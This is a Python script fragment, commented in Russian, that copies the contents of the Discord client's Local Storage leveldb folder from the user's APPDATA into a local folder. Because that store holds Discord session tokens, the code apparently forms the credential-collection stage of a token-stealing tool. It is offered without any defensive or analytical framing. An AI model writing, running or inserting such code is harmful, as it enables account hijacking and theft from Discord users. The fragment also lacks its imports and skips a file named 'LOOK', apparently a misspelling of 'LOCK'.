current_dir = os.path.dirname(os.path.abspath(__file__))

# Путь к папке leveldb в директории Local Storage
leveldb_path = os.path.join(os.getenv("APPDATA"), 'discord', 'Local Storage', 'leveldb')

# Проверяем существование папки leveldb, и если она есть, то копируем ее содержимое в папку leveldb в текущей папке
leveldb_target_path = os.path.join(current_dir, 'leveldb')

if not os.path.exists(leveldb_target_path):
    os.makedirs(leveldb_target_path)

for filename in os.listdir(leveldb_path):
    if filename == "LOOK":
        continue

    file_path = os.path.join(leveldb_path, filename)
    if os.path.isfile(file_path):
        try:
            shutil.copy(file_path, os.path.join(leveldb_target_path, filename))
            print(f"File {filename} copied successfully.")
        except Exception as e:
            print(f"An error occurred during copying {filename}: {e}")

print(f"ЗАКОНЧИЛ")
